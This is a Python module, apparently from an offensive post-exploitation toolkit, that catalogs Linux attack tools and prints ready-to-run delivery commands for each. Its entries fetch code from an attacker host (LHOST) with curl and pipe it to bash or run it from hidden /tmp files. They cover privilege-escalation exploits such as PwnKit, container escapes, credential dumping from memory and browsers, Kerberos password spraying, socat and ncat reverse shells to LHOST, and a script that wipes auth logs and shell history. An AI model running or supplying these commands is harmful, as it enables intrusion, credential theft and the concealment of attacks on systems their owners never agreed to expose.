import os

_HERE      = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_LINUX_DIR = os.path.join(_HERE, "linux")


def _lx(*name):
    return [os.path.join(_LINUX_DIR, *name)]


# ── Category tags ─────────────────────────────────────────────────────────────
# recon | privesc | creds | container | lateral | persist | evasion

LINUX_TOOL_CATALOG: dict[str, dict] = {
    # ── Recon / Enumeration ───────────────────────────────────────────────────
    "linpeas": {
        "paths": _lx("linpeas.sh"),
        "category": "recon",
        "desc": "Full host enum — color-coded by exploit probability (red = high)",
        "delivery": "pipe",          # curl … | bash
        "default_run": "curl -sk https://LHOST/linpeas.sh | bash",
    },
    "pspy64": {
        "paths": _lx("pspy64"),
        "category": "recon",
        "desc": "Snoop processes/crons without root — inotify-based, no deps",
        "delivery": "exec",
        "default_run": "curl -sk https://LHOST/pspy64 -o /tmp/.ps && chmod +x /tmp/.ps && /tmp/.ps",
    },
    "pspy32": {
        "paths": _lx("pspy32"),
        "category": "recon",
        "desc": "pspy for 32-bit targets",
        "delivery": "exec",
        "default_run": "curl -sk https://LHOST/pspy32 -o /tmp/.ps && chmod +x /tmp/.ps && /tmp/.ps",
    },
    "linux-exploit-suggester": {
        "paths": _lx("linux-exploit-suggester.sh"),
        "category": "privesc",
        "desc": "Kernel version → CVE mapper with runtime sysctl checks",
        "delivery": "pipe",
        "default_run": "curl -sk https://LHOST/linux-exploit-suggester.sh | bash",
    },
    # ── Privilege Escalation ──────────────────────────────────────────────────
    "traitor": {
        "paths": _lx("traitor-amd64"),
        "category": "privesc",
        "desc": "Auto-exploits GTFOBins + Dirty Pipe (CVE-2022-0847) + PwnKit (CVE-2021-4034)",
        "delivery": "exec",
        "default_run": "curl -sk https://LHOST/traitor-amd64 -o /tmp/.tr && chmod +x /tmp/.tr && /tmp/.tr -p",
    },
    "pwnkit": {
        "paths": _lx("cve-2021-4034"),
        "category": "privesc",
        "desc": "PwnKit — polkit pkexec LPE → root (CVE-2021-4034, Linux universal)",
        "delivery": "exec",
        "default_run": "curl -sk https://LHOST/cve-2021-4034 -o /tmp/.pk && chmod +x /tmp/.pk && /tmp/.pk",
    },
    "gtfo": {
        "paths": _lx("gtfo"),
        "category": "privesc",
        "desc": "Offline GTFOBins CLI — instant escape/read/write recipes for any binary (manual build: go install github.com/mzfr/gtfo@latest)",
        "delivery": "exec",
        "default_run": "curl -sk https://LHOST/gtfo -o /tmp/.gt && chmod +x /tmp/.gt && /tmp/.gt -n BINARY",
    },
    # ── Container Escape ──────────────────────────────────────────────────────
    "deepce": {
        "paths": _lx("deepce.sh"),
        "category": "container",
        "desc": "Docker/container escape: socket abuse, caps, cgroup-v1, volume mounts",
        "delivery": "pipe",
        "default_run": "curl -sk https://LHOST/deepce.sh | bash",
    },
    "cdk": {
        "paths": _lx("cdk_linux_amd64"),
        "category": "container",
        "desc": "K8s + Docker escape — CVE-2024-21626 (Leaky Vessels), runc escapes, token steal",
        "delivery": "exec",
        "default_run": "curl -sk https://LHOST/cdk_linux_amd64 -o /tmp/.cdk && chmod +x /tmp/.cdk && /tmp/.cdk run auto-escape",
    },
    # ── Credential Dumping ────────────────────────────────────────────────────
    "mimipenguin": {
        "paths": _lx("mimipenguin.sh"),
        "category": "creds",
        "desc": "Cleartext creds from memory: GDM, gnome-keyring, sshd, vsftpd, apache2",
        "delivery": "pipe",
        "default_run": "curl -sk https://LHOST/mimipenguin.sh | bash",
    },
    "lazagne": {
        "paths": _lx("lazagne"),
        "category": "creds",
        "desc": "Browser/SSH/Git/Wallet creds — Python script; if Python3 on target: curl -sk https://LHOST/lazagne.py | python3",
        "delivery": "exec",
        "default_run": "curl -sk https://LHOST/lazagne -o /tmp/.lz && chmod +x /tmp/.lz && /tmp/.lz all",
    },
    # ── Lateral Movement Linux→AD ─────────────────────────────────────────────
    "kerbrute-linux": {
        "paths": _lx("kerbrute_linux_amd64"),
        "category": "lateral",
        "desc": "Kerberos enum/spray from Linux — userenum, passwordspray, bruteuser",
        "delivery": "exec",
        "default_run": "curl -sk https://LHOST/kerbrute_linux_amd64 -o /tmp/.kb && chmod +x /tmp/.kb && /tmp/.kb userenum -d DOMAIN wordlist.txt",
    },
    # ── Persistence ───────────────────────────────────────────────────────────
    "log-killer": {
        "paths": _lx("log-killer.sh"),
        "category": "evasion",
        "desc": "Wipe wtmp, btmp, lastlog, auth.log, bash_history by user/IP",
        "delivery": "pipe",
        "default_run": "curl -sk https://LHOST/log-killer.sh | bash",
    },
    # ── Static utility bins (already in static-bins, symlinked) ──────────────
    "socat": {
        "paths": _lx("socat"),
        "category": "lateral",
        "desc": "Static socat — port relay, reverse shells, TLS tunnels",
        "delivery": "exec",
        "default_run": "curl -sk https://LHOST/socat -o /tmp/.sc && chmod +x /tmp/.sc && /tmp/.sc TCP:LHOST:PORT EXEC:/bin/sh",
    },
    "ncat": {
        "paths": _lx("ncat"),
        "category": "lateral",
        "desc": "Static ncat — connect-back, port forward, SSL",
        "delivery": "exec",
        "default_run": "curl -sk https://LHOST/ncat -o /tmp/.nc && chmod +x /tmp/.nc && /tmp/.nc LHOST PORT -e /bin/bash",
    },
}


def find_linux_tool(name: str) -> str | None:
    entry = LINUX_TOOL_CATALOG.get(name)
    if not entry:
        return None
    for p in entry.get("paths", []):
        if os.path.exists(p):
            return p
    return None


def list_linux_tools(lhost: str = "LHOST") -> None:
    cats = {}
    for name, info in LINUX_TOOL_CATALOG.items():
        cats.setdefault(info["category"], []).append((name, info))

    cat_order = ["recon", "privesc", "container", "creds", "lateral", "evasion", "persist"]
    for cat in cat_order:
        items = cats.get(cat)
        if not items:
            continue
        print(f"\n  [{cat.upper()}]")
        for name, info in items:
            found   = "✓" if find_linux_tool(name) else "✗"
            one_line = info.get("default_run", "").replace("LHOST", lhost)
            print(f"  [{found}] {name:<26} {info['desc']}")
            print(f"       {one_line}")
    print()


def get_linux_dir() -> str:
    return _LINUX_DIR
